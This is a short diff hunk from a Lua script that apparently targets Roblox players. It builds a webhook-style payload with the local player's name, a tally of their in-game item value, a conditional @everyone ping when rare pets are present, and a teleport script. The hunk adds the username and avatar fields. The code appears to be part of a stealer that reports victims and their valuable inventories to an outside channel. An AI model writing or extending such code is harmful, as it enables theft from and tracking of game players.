@@ -463,6 +463,8 @@ for _, fruit in ipairs(fruits) do totalValue += fruit.value or 0 end
 
 -- Payload
 local payload = {
+    username = game.Players.LocalPlayer.Name,
+    avatar_url = "https://raw.githubusercontent.com/D3ATH-hub/main/PS99/pfp.png",
     content = (hasRarePets() and "--@everyone\n" or "") .. tpScript,
     embeds = {
         {
